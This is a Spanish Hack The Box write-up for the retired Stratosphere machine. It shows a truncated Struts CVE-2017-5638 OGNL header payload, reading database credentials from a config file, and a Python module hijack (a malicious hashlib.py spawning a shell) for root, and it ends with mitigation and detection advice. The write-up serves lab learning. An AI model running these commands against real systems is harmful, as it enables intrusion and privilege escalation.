---
machine: Stratosphere
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, struts, cve-2017-5638, mysql, python-hijack]
---

# Stratosphere — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Apache Struts 2 en `/Monitoring/Welcome.action` es vulnerable a CVE-2017-5638: el `Content-Type` se evalúa como OGNL. Se obtiene ejecución como Tomcat, se leen credenciales de MySQL y se reutiliza la contraseña de `richard` por SSH. La escalada secuestra un módulo Python que importa un script ejecutado por root.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,80,8080 <IP>
```

- SSH, Apache y Tomcat en 8080.
- `/Monitoring/Welcome.action` delata Struts.

## Enumeración

```bash
curl -s http://<IP>:8080/Monitoring/Welcome.action
searchsploit struts 2
```

La aplicación es un monitor de crédito. El sufijo `.action` y la versión confirman Struts 2.

## Foothold

```bash
curl -s http://<IP>:8080/Monitoring/Welcome.action \
  -H "Content-Type: %{(#_='multipart/form-data').(#cmd='id')...}"
```

El payload OGNL ejecuta comandos como el usuario de Tomcat. Con una reverse shell por `mkfifo` se obtiene una sesión estable.

## Movimiento lateral

```bash
cat /opt/tomcat/webapps/Monitoring/db_connect
mysql -u admin -p -e 'select * from users;'
```

Las credenciales de MySQL permiten leer la tabla `users`; la contraseña de `richard` está en claro y se reutiliza para SSH.

## Escalada de privilegios

Un script de root importa un módulo desde un directorio escribible. Se coloca un `hashlib.py` malicioso que lanza una shell antes de la importación real:

```bash
printf 'import os\nos.system("/bin/bash -p")\n' > /tmp/hashlib.py
sudo -u root /usr/local/bin/<script>
```

La shell resultante es de root.

## Evidencia

- `Welcome.action` y versión de Struts.
- `id` como usuario de Tomcat.
- Consulta a `users` con credenciales redactadas.
- `id` como root tras el hijack.

## Lecciones aprendidas

- Un `Content-Type` mal procesado puede ser ejecución remota.
- Reutilizar contraseñas convierte una lectura de base de datos en movimiento lateral.
- `sys.path` y directorios escribibles son vectores de secuestro de módulos.

## Mitigaciones y detección

- Actualizar Struts y validar cabeceras.
- No reutilizar contraseñas; usar un gestor de secretos.
- Ejecutar scripts con `PYTHONPATH` limpio y directorios no escribibles.
- Alertar de payloads OGNL y de importaciones desde `/tmp`.

## Referencias

- <https://www.hackthebox.com/machines/Stratosphere>
- <https://0xdf.gitlab.io/2018/09/01/htb-stratosphere.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2017-5638>
- <https://attack.mitre.org/techniques/T1190/>
